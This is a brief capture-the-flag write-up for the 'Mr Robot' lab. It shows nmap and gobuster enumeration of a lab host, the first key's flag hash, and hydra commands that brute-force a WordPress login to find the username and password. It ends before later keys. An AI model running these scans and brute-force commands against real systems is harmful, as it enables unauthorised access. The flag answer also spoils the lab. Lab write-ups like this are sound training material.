#Mr Robot CTF

## export IP=10.10.252.20

## nmap -v -sC -sV -oA scans/initial $IP

PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
443/tcp open   ssl/http Apache httpd
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| ssl-cert: Subject: commonName=www.example.com
| Issuer: commonName=www.example.com
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2015-09-16T10:45:03
| Not valid after:  2025-09-13T10:45:03
| MD5:   3c16 3b19 87c3 42ad 6634 c1c9 d0aa fb97
|_SHA-1: ef0c 5fa5 931a 09a5 687c a2c2 80c4 c792 07ce f71b
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).

## Key 1

gobuster dir -u $IP -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -t 100 -q -o scans/gobuster-small.txt

/sitemap              (Status: 200) [Size: 0]
/wp-login             (Status: 200) [Size: 2606]
/readme               (Status: 200) [Size: 64]
/robots               (Status: 200) [Size: 41]

http://10.10.252.20/robots.txt

What is key 1?
key-1-of-3.txt -> 073403c8a58a1f80d943455fb30724b9

## Key 2

Go to /wp-login

use burpsuite to understand user/password post parameter syntax

hydra -L fsocity.dic -p test $IP http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:Invalid username" -t 30

Elliot

hydra -l Elliot -P fsocity.dic $IP http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:The password you entered for the username" -t 30
